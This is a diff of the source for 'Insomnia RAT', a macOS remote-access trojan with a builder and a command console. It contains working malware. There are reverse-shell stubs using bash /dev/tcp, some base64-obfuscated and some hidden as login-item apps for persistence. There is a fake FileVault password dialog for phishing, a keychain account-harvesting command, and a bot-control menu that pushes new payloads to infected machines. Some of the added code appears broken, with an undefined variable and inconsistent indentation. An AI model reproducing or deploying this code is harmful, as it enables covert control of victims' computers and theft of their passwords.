@@ -1,5 +1,6 @@
 import os
 import base64
+import socket
 
 redoo = 1
 
@@ -14,7 +15,7 @@ while True:
 \033[1m
 [1] Build Stub
 
-[2] Listener
+[2] Clients
 
 [3] Exit
 
@@ -46,62 +47,31 @@ Select any option: """)
 			except:
 					redoo = 1
 					os.system('clear')
-			while(redsdo == 1):
+			while(redoo == 1):
 						print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
 \033[1m""")
-						print('Stub Types:\n\n[1] Regular .app Application\n\n[2] Python Script\n\n[3] Shell Script\n\n')
-						bb = int(raw_input('Enter Option: '))
 						os.system('clear')
-						if(bb == 1):
-							redsdo = 0;
-							stubData = """set myPath to path to me
-set thePath to POSIX path of myPath
-do shell script "chflags hidden " & thePath
-tell application "System Events"
-	make new login item at end of login items with properties {name:"", path:myPath, hidden:false}
-end tell
-do shell script "chflags nohidden " & thePath
-repeat
-	try
-		do shell script "bash >& /dev/tcp/""" + hostName + """/""" + portNum + """ 0>&1"
-	on error
-		delay 0.1
-	end try
-end repeat"""
-							n = open('/Library/Fonts/tempCMKDN.scpt', 'w+')
-							n.write(stubData)
-							n.close()
-							os.system("osacompile -o ~/Desktop/" + stubName + ".app /Library/Fonts/tempCMKDN.scpt")
-							os.system('rm -rf /Library/Fonts/tempCMKDN.scpt')
-							s = open(hd + '/Desktop/' + stubName + '.app/Contents/Info.plist', 'r')
-							x = s.readlines()
-							s.close()
-							x.pop(-1)
-							x.pop(-1)
-							x.append('\t<key>LSBackgroundOnly</key>\n')
-							x.append('\t<true/>\n')
-							x.append('\t<key>LSUIElement</key>\n')
-							x.append('\t<string>1</string>\n')
-							x.append('</dict>\n')
-							x.append('</plist>\n')
-							a = ''.join(x)
-							d = open(hd + '/Desktop/' + stubName + '.app/Contents/Info.plist', 'w+')
-							d.write(a)
-							d.close()
-						elif (bb == 2):
-							print('bbb')
-							redsdo = 0;
-							tmpData = base64.b64encode("import os\nimport base64\nfrom time import sleep\nwhile(True):\n     sleep(0.1)\n     os.system('bash >& /dev/tcp/" + hostName + "/" + portNum + " 0>&1')")
-							stubData = """import os\nimport base64\nexec(base64.b64decode('"""+tmpData+"""'))"""
-							d = open(hd + '/Desktop/' + stubName + '.py', 'w+')
-							d.write(stubData)
-							d.close()
-						elif (bb == 3):
-							redsdo = 0;
-							stubData = 'bash >& /dev/tcp/' + hostName + '/' + portNum + ' 0>&1'
-							r = open(hd + '/Desktop/' + stubName + '.sh', 'w+')
-							r.write(stubData)
-							r.close()
+						redsdo = 0;
+						stubData = """
+						#!/usr/bin/env python3
+
+						import socket
+
+						HOST = '"""+hostName+"""'  
+						PORT = """+portNum+"""        
+
+						with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+						    s.connect((HOST, PORT))
+						    s.sendall(b'Hello, world')
+						    data = s.recv(1024)
+
+						print('Received', repr(data))"""
+						stubData = base64.b64encode(stubData)
+						stubData = """import os\nimport base64\nexec(base64.b64decode('"""+tmpData+"""'))"""
+						d = open(hd + '/Desktop/' + stubName + '.py', 'w+')
+						d.write(stubData)
+						d.close()
+
 						else:
 							print('aadas')
 							redsdo = 1;
@@ -111,6 +81,19 @@ end repeat"""
 \033[1m""")
 		portListen = raw_input('Enter port number to listen on from 1024 to 65535: ')
 		os.system('clear')
+		selectBot = True
+		while(selectBot):
+			print('\033[91m\033[1mOptions:\033[0;0m\033[1m\n1: Send command to all connected bots\n2: Send command to specific bot\n3: Exit prompt\n')
+			botChoice = raw_input('Enter Option:')
+			if(botChoice == 1):
+				print('Enter IP address of target or type "LIST" to show all currently connected bots:')
+				target = raw_input('')
+				if(target.startswith('LIST')):
+					a=1
+				else:
+					selectBot = False
+			elif(botChoice == 2):
+				selectBot = False
 		while True:
 			print('\033[91m\033[1mCommands:\033[0;0m\033[1m\n__help: Display Help\n__get_info: Get Info on Client\'s System\n__phish: Popup fake password prompt on client machine and return output\n__get_email: Get Client\'s email address\n__exit: Exit prompt\n[Any other command]: Anything else inputted will be sent as a shell command on the client\'s machine')
 			cmdd = raw_input('Enter Command: ')
@@ -120,12 +103,6 @@ end repeat"""
 				ph = "tell application \"Finder\"\nactivate\nset myprompt to \"Type your password to allow System Preferences to make changes\"\nset ans to \"Cancel\"\nrepeat\ntry\nset d_returns to display dialog myprompt default answer \"\" buttons {\"Cancel\", \"OK\"} default button \"OK\" with icon (path to resource \"FileVaultIcon.icns\" in bundle \"/System/Library/CoreServices/CoreTypes.bundle\") with hidden answer\nset ans to button returned of d_returns\nset mypass to text returned of d_returns\nif mypass > \"\" then exit repeat\nend try\nend repeat\ntry\ndo shell script \"echo Password: \" & quoted form of mypass\nend try\nend tell"
 				ph = "osascript -e '" + ph + "'"
 				cmdd = ph
-			elif cmdd == '__get_info':
-				cmdd = "osascript -e \'get system info\'"
-			elif cmdd == '__cmd_shell':
-				cmdd = "bash"
-			elif cmdd == '__get_email':
-				cmdd = "security find-internet-password | grep 'acct'"
 			elif cmdd == '__exit':
 				print('Goodbye!')
 				quit()
@@ -133,7 +110,57 @@ end repeat"""
 				helpSec()
 			elif cmdd == '':
 				v = 1
-			os.system("echo \"" + cmdd + "\" | nc -l " + portListen)
+			elif cmdd == '__get_info':
+				cmdd = "osascript -e \'get system info\'"
+			elif cmdd == '__cmd_shell':
+				cmdd = "bash"
+			elif cmdd == '__get_email':
+				cmdd = "security find-internet-password | grep 'acct'"
+			elif '__change_conn' in cmdd:
+				a=cmdd.replace('__change_conn[', '')
+				a=cmdd.replace(']', '')
+				hostt = a.split(':')[0]
+				portt = a.split(':')[1]
+				newStubb = """set myPath to path to me
+set thePath to POSIX path of myPath
+do shell script "chflags hidden " & thePath
+tell application "System Events"
+	make new login item at end of login items with properties {name:"", path:myPath, hidden:false}
+end tell
+do shell script "chflags nohidden " & thePath
+repeat
+	try
+		do shell script "bash >& /dev/tcp/"""+hostt+"""/"""+portt+"""0>&1"
+	on error
+		delay 0.1
+	end try
+end repeat"""
+				os.system("echo 'echo \'"+newStubb+"\' > /Library/Fonts/a.scpt' | nc -l " + portListen)
+				os.system("echo 'osacompile -o /Library/Fonts/a.app /Library/Fonts/a.scpt' | nc -l " + portListen)
+				os.system("echo 'rm -rf /Library/Fonts/a.scpt' | nc -l " + portListen)
+				
+				cmdd = ''
+
+
+			HOST = '127.0.0.1'  
+			PORT = portNum        
+
+			with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+			    s.bind((HOST, PORT))
+			    s.listen()
+			    conn, addr = s.accept()
+			    sendCon = True
+			    with conn:
+			    	if(botChoice == 1):
+			    		if(addr != target):
+			    			sendCon = False
+			        while sendCon:
+			            data = conn.recv(1024)
+			            if not data:
+			                break
+			            conn.sendall(cmdd)
+			            if(botChoice == 1):
+			            	continue
 	elif x == '3':
 		os.system('clear')
 		quit()
